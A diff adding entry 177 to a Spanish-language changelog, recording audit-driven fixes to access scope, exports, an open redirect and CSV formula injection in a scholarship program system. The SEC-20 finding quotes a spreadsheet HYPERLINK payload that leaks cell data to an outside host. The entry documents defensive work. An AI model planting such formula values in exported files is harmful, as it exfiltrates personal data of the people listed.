@@ -346,6 +346,7 @@ Los campos que no apliquen se escriben como «No requiere» o «No aplica»; no 
 | 172 | Trece reglas de negocio de Becas, y la edad que estaba escrita seis veces | Becas (revisión de casos, constructor de formularios, convocatorias, segmentos y subsegmentos, carga de padrón, pausas) · Legajos e Inicio (contadores «de hoy», edad del ciudadano, alertas) · Transversal (`core/edad.py`, regla `DTZ011`) | `#relevamientos` `#cupos` `#datos` `#ui` `#requisitos` | Auditoría integral oct-2026 — fichas BEC-03, BEC-04, BEC-05, BEC-06, BEC-07, BEC-09, BEC-10, BEC-15, BEC-16, BEC-17, BEC-18, BEC-20 y BEC-24, más RED-50 (Ola 3, PR 6) | 08/10/2026 | 🟢 **Hecho** (D-B05 y D-B10 aplicadas por default) | `programas.0079` y `legajos.0009`, las dos sin DDL |
 | 173 | Los campos propios del constructor llegan al Excel por persona y al dashboard de Becas | Becas (tablero del programa y su exportación «respuestas por persona») · Comandos de management (ratchets y alta masiva por CSV) | `#requisitos` `#performance` `#metodo` | Auditoría integral oct-2026 — ficha G2-01 y los cinco seguimientos de las revisiones de los PRs 1 y 3 (Ola 3, PR 8) | 07/10/2026 | 🟢 **Hecho** | No requiere |
 | 174 | Las integraciones dejan de inventar identidades: el domicilio no es el nombre y un 401 de RENAPER no deja el token muerto | Becas (link público, revisión, alta a SIIS) · Legajos (consulta RENAPER) · Transversal (system checks, validación de adjuntos) | `#siis` `#datos` `#infra` `#metodo` | Auditoría integral oct-2026 — fichas SIIS-10, SIIS-13, SIIS-14 (+G3-02), SIIS-15, SIIS-16, SIIS-18, SIIS-20, SIIS-21 y G1c-15 (Ola 3, PR 7a) | 08/10/2026 | 🟢 **Hecho** (SIIS-13 cierra su opción (a) y SIIS-16 deja el techo de nginx como paso operativo) | No requiere |
+| 177 | El alcance de Becas vale también fuera de la pantalla: cupo, reportes, exports y la solapa del legajo | Becas (cupo, revisión, relevamientos, reportes, tablero del programa, configuración de segmentos) · Legajos (padrón de ciudadanos, solapa Becas, CSV de reportes) · Transversal (catálogo de capacidades) | `#rbac` `#cupos` `#relevamientos` `#datos` `#metodo` | Auditoría integral oct-2026 — fichas SEC-20, SEC-21, SEC-22, SEC-30, BEC-19 y BEC-23, más la segunda parte de RED-79 (Ola 2, PR 5) | 08/10/2026 | 🟢 **Hecho** (D-20, D-22 y D-B23 aplicadas por default) | `users.0027` y `users.0028`, las dos sin DDL; la segunda se revierte quitando la capacidad de todos los roles |
 
 **Notas del índice**
 
@@ -25099,3 +25100,194 @@ fija además un test que abre la ventana a mano
 el commit anterior falla con el mensaje exacto del hallazgo en 3 de 3 corridas.
 Los tests de hilos se corrieron **8 veces seguidas** en verde para descartar
 *flakes*.
+
+# Cambio 177 — El alcance de Becas vale también fuera de la pantalla: cupo, reportes, exports y la solapa del legajo
+
+🟢 **HECHO — 08/10/2026**
+
+| | |
+|---|---|
+| **Programa / módulo** | Becas (cupo, revisión, relevamientos, reportes, tablero del programa, configuración de segmentos) · Legajos (padrón de ciudadanos, solapa Becas, CSV de reportes) · Transversal (catálogo de capacidades) |
+| **Etiquetas** | `#rbac` `#cupos` `#relevamientos` `#datos` `#metodo` |
+| **Solicitante** | Auditoría integral oct-2026 — fichas SEC-20, SEC-21, SEC-22, SEC-30, BEC-19 y BEC-23, más la segunda parte de RED-79 (Ola 2, PR 5) |
+| **Fecha del pedido** | 08/10/2026 |
+| **Issue / épica** | Auditoría oct-2026, Ola 2 ítems 5 y 9 |
+| **Partes afectadas** | Pantalla de cupo por segmento · Reportes de Becas y su exportación · Tablero del programa y el Excel «respuestas por persona» · Los tres CSV de la convocatoria · Padrón de ciudadanos (CSV) y su botón · Solapa «Becas» del legajo · Requisitos, subsegmentos y coordinadores del segmento |
+| **Migración** | `users.0027` (capacidad nueva, sin DDL) y `users.0028` (siembra de la capacidad, datos) |
+
+## Pedido original
+Seis hallazgos que comparten una sola raíz: **el alcance de Becas estaba escrito
+en las pantallas y no en los datos**. Las tres copias del guard vivían en dos
+vistas, el filtro del link público en otras dos, y lo que no pasaba por esas
+pantallas —el cupo, los reportes, el tablero, los CSV, la solapa del legajo—
+quedaba sin regla.
+
+- **SEC-21:** la pantalla de cupo filtraba por **segmento**. El Coordinador
+  Regional entra al segmento que contiene su subsegmento, así que veía con
+  nombre y DNI a los beneficiarios, la lista de espera y los pendientes de los
+  subsegmentos de sus pares, y con `becas.beneficiario.editar` tildado los daba
+  de baja por URL directa. Contradecía el Cambio 18 («ni por URL directa»).
+- **SEC-22:** RN-P13 (los casos del link público solo los ve quien tiene
+  `becas.relevamiento.publico`) valía en los listados y no en el resto: un
+  Referente con `becas.reportes.exportar` se bajaba el XLSX con DNI, celular,
+  email, GPS y todas las respuestas de los casos que en pantalla no podía ver.
+- **SEC-20:** los cinco CSV que se arman a mano escribían el valor crudo. Un
+  apellido `=HYPERLINK("https://x/?"&A2;"ver")` —cargado por el link público o
+  por la app— se ejecuta al abrir el archivo en Excel. Y cualquier
+  `ciudadano.ver` se descargaba el padrón completo (~100.000 personas) sin
+  límite ni registro.
+- **SEC-30 (latente):** los requisitos, los subsegmentos y los coordinadores se
+  validaban contra el **segmento**, así que el día que alguien le tilde
+  `becas.requisito.editar` al Regional —que es para lo que la pantalla de Roles
+  está— borra el requisito del subsegmento de un par.
+- **BEC-19:** los dos POST de la tabla de convocatorias redirigían a
+  `POST["next"]` sin validar.
+- **BEC-23:** la solapa «Becas» del legajo mostraba todos los casos de la
+  persona con solo `ciudadano.ver`.
+- **RED-79 (parte 2):** el ratchet del PR R-21 dejó medido el desorden —nueve
+  aristas vista→vista y seis ciclos de import— y la Ola 2 tenía que bajarlo.
+
+## Alcance acordado
+Entran las seis fichas y la mitad «movimientos» de RED-79. Queda afuera todo lo
+que es de otros PRs de la ola (el catálogo de SEC-06, los usuarios, el
+WebSocket, la app de campo) y `PaginadorConConteo`, que es la arista
+`revision → relevamientos` que sobrevive y pertenece a otra ficha.
+
+## Decisiones tomadas
+- **El alcance de un caso es uno solo y vive en `services/autorizacion.py`.**
+  `assert_alcance_relevamiento` y `assert_alcance_formulario` reemplazan las
+  tres copias (`relevamientos._assert_scope`,
+  `revision._assert_scope_relevamiento`, `revision._assert_scope_formulario`), y
+  lo mismo con el filtro de RN-P13 (`puede_relevamiento_publico`,
+  `sin_relevamientos_publicos_si_no_puede`,
+  `sin_formularios_publicos_si_no_puede`) y con la constante
+  `CAP_RELEVAMIENTO_PUBLICO`. `configuracion._assert_scope` —el homónimo que
+  miraba un segmento— pasa a `_assert_scope_segmento`.
+- **El cupo se filtra por convocatorias visibles, no por segmento.** Con ids
+  planos y no una subconsulta anidada: son decenas de filas y las tres consultas
+  de la pantalla la repetirían (el patrón que ya costó un 500 en ECOM). Las tres
+  mutaciones usan el mismo guard que el listado.
+- **«Ya está en espera» se sigue mirando sobre todo el segmento.** Un caso que
+  otro coordinador puso en la lista no tiene que reaparecer como pendiente en la
+  pantalla de al lado: lo que se acota es lo que se **ve y se muta**, no la
+  verdad del cupo.
+- **DECISIÓN CLIENTE D-22 = Sí:** RN-P13 alcanza a reportes, XLSX y cupo. El
+  recorte del tablero (`resolver_alcance`) excluye los relevamientos públicos de
+  una sola vez, así que se van de los indicadores, las series, las
+  distribuciones y los bloques exportables. **Y la huella de la caché lleva la
+  capacidad**: sin eso, dos usuarios con los mismos segmentos y distinto RN-P13
+  compartían la entrada y el filtro no se notaba hasta que alguien lo probaba al
+  revés.
+- **DECISIÓN CLIENTE D-20 = Sí:** `ciudadano.exportar` es una capacidad propia
+  del catálogo (nada de permisos sueltos), sembrada por migración a los roles
+  que ya tienen `ciudadano.editar`. La migración **solo agrega** filas; lo que
+  cambia es que la vista exige la capacidad nueva, así que un rol con
+  `ciudadano.ver` y sin `ciudadano.editar` —el «Operador de backoffice»
+  sembrado, que ni siquiera da altas— deja de poder bajarse el padrón. La
+  migración lista esos roles en el log del deploy para que el organismo decida.
+  El botón sigue a la capacidad, y la descarga queda registrada con usuario,
+  filas y búsqueda.
+- **DECISIÓN CLIENTE D-B23:** la solapa Becas del legajo es transversal —muestra
+  los casos de cualquier segmento— pero oculta los del link público a quien no
+  tiene RN-P13. Ahí la capacidad se evalúa **sin acotar al Programa Becas** a
+  propósito: resolver el Programa en esa pantalla agrega una lectura y su
+  presupuesto no tolera consultas duplicadas (`legajo_detalle` en
+  `scripts/perf_budgets.json`). Acotarlo es parte del barrido de SEC-06/SEC-07.
+- **SEC-30:** `puede_configurar_segmento` separa «operar dentro del segmento» de
+  «configurar el segmento». El Regional configura **su** subsegmento y nada del
+  nivel de arriba, ni siquiera del segmento que lo contiene.
+- **`respuestas_por_persona` recibe `incluir_publicos` obligatorio**, sin valor
+  por defecto: es RN-P13 y lo resuelve quien tiene al usuario a mano. Un default
+  abierto es la forma en que este bug vuelve.
+
+## Lo que la ficha no pedía y entra igual
+- El CSV de lista de espera de la convocatoria tampoco filtraba los casos del
+  link público (la ficha nombraba los otros dos exports).
+- Los **encabezados** de CSV y XLSX pasan por `celda_segura`: en «respuestas por
+  persona» son los textos de las preguntas, que los carga un operador.
+- `programas_siis_visibles` (ex `_programas_qs`) queda en `autorizacion.py` y no
+  en `programas/selectors/`, como decía RED-79: ese paquete **no existe** en
+  `programas` y el resto de los querysets de alcance de Becas ya vive ahí.
+
+## Archivos
+- `programas/services/autorizacion.py` — `CAP_RELEVAMIENTO_PUBLICO`,
+  `puede_relevamiento_publico`, los dos filtros, `assert_alcance_*`,
+  `puede_configurar_segmento` y `programas_siis_visibles`
+- `programas/views/cupo.py` — alcance por convocatorias visibles + RN-P13 en las
+  tres tablas y en las tres mutaciones
+- `programas/views/relevamientos.py`, `programas/views/revision.py`,
+  `programas/views/pausas.py`, `programas/views/configuracion.py` — usan los
+  guards y los filtros del servicio; `_destino_seguro` (BEC-19);
+  `celda_segura` en los tres CSV; `_assert_scope_segmento` y el alcance por
+  subsegmento de los requisitos
+- `programas/services/dashboard_becas.py` — `resolver_alcance` y la huella de
+  caché con RN-P13; `respuestas_por_persona(…, incluir_publicos)`
+- `programas/services/reportes_becas.py` — `_formularios` y la lista de espera
+- `programas/services/solapas.py`, `programas/views/solapas_becas.py`,
+  `legajos/selectors/ciudadanos.py` — BEC-23
+- `programas/services/exportacion_reportes.py` — encabezados saneados
+- `core/rbac.py` — `ciudadano.exportar` en el `CATALOGO`
+- `legajos/views/ciudadanos.py`, `legajos/templates/legajos/ciudadano_list.html`,
+  `legajos/views/dashboard_simple.py` — capacidad, registro y `celda_segura`
+- `users/migrations/0027_capacidad_ciudadano_exportar.py`,
+  `users/migrations/0028_sembrar_ciudadano_exportar.py`
+- Tests nuevos: `programas/tests/test_coordinador_regional.py`
+  (`AlcanceDeCupoTests`, `ConfiguracionDelSegmentoTests`),
+  `programas/tests/test_relevamiento_publico.py`
+  (`RnP13FueraDeLaPantallaTests`), `programas/tests/test_solapa_becas.py`
+  (`AlcanceTests`), `programas/tests/test_reportes.py`
+  (`ExportsDeConvocatoriaTests`), `legajos/tests/test_ciudadanos_export.py`
+  (`ExportarCiudadanosCapacidadTests` y la fórmula),
+  `programas/tests/test_becas_vencimientos.py` (los tres del `next`)
+- Tests tocados por el movimiento: `programas/tests/test_arquitectura.py` (los
+  dos ratchets bajan y `GuardsDeAlcanceTests` se da vuelta),
+  `programas/tests/test_becas_rbac.py`,
+  `programas/tests/test_candados_concurrencia.py`,
+  `programas/tests/test_padron.py`, `portal/tests/test_correcciones_review.py`,
+  `portal/tests/test_correcciones_review_2.py`, y los que llaman a
+  `respuestas_por_persona`
+
+## Base de datos
+Dos migraciones, ninguna con DDL:
+
+- **`users.0027_capacidad_ciudadano_exportar`** declara la capacidad en el modelo
+  ancla (`AlterModelOptions`): el `post_migrate` de `auth` materializa la fila en
+  `auth_permission`.
+- **`users.0028_sembrar_ciudadano_exportar`** la tilda sobre los roles que ya
+  tienen `ciudadano.editar`. Solo **agrega** filas en `auth_group_permissions`.
+
+Expand puro: el código viejo no conoce la capacidad y le da igual que exista, así
+que las dos pueden ir en la release N sin esperar a la N+2.
+
+## Reversión
+1. `git revert` del merge y desplegar: el código vuelve a exigir `ciudadano.ver`
+   para exportar el padrón, así que **nadie queda sin poder exportar** aunque las
+   migraciones sigan aplicadas. Este paso solo alcanza.
+2. Si además se quiere limpiar la capacidad del ABM de Roles:
+   `manage.py migrate users 0026`. Desaplica las dos. La reversa de la `0028`
+   quita `ciudadano.exportar` de **todos** los roles que la tengan: un tilde
+   hecho a mano después del deploy se pierde —no hay forma de distinguirlo del
+   que puso la migración— y hay que volver a tildarlo si se reaplica, porque la
+   siembra vuelve a salir de `ciudadano.editar`. La `0027` no borra la fila de
+   `auth_permission` (eso lo hace `remove_stale_contenttypes`, que no corre en el
+   deploy): queda huérfana y sin efecto.
+3. Lo que **no** se deshace: nada de datos. Los cambios de alcance son de lectura
+   —qué casos entran en una consulta— y los CSV ya descargados siguen como están.
+
+## Validación
+**No se pudo ejecutar nada en la sesión donde se escribió este cambio**: el
+entorno no tenía permiso para correr el intérprete del venv ni `git`. Lo que
+queda escrito acá es lo que el PR declara y lo que el juez tiene que correr
+antes de mergear, con `.venv312` (Python 3.12 + Django 5.2.17, igual al CI):
+`manage.py check`, `check --deploy`, `makemigrations --check --dry-run`,
+`manage.py test` (suite entera, un solo proceso), `test --tag performance`,
+`ruff check .`, `ruff format --check`, `scripts/design_audit.py --changed`,
+`scripts/compile_templates.py`, `scripts/check_design_agent.py --changed` y la
+ida y vuelta de las migraciones contra `mariadb:10.11` y `mysql:8.0`.
+
+Los tests nuevos están escritos para fallar antes del cambio, cada uno por su
+motivo: el cupo del Regional listaba y daba de baja el caso del par; el XLSX, el
+reporte y el cupo traían los casos del link público; el CSV del padrón se
+descargaba con `ciudadano.ver` y con la fórmula cruda; el `next` ajeno se
+obedecía; el requisito del subsegmento del par se borraba; y la solapa del
+legajo listaba los casos públicos.
